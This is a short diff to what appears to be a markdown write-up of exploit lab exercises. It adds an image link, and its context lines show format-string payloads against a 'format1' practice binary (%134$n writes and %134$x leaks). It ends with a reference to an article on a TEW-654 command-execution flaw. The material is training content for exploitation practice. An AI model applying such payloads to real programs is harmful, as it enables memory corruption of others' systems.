@@ -108,6 +108,8 @@ python -c 'print "\x37\x96\x04\x08A%134$n"'
 
 ./format1 \`python -c 'print "\x38\x96\x04\x08AAA%134$x"'\`
 
+![](/png/55.png)
+
 ref:
 
 [http://www.atomsec.org/iot/tew654-命令执行漏洞/](http://www.atomsec.org/iot/tew654-命令执行漏洞/)
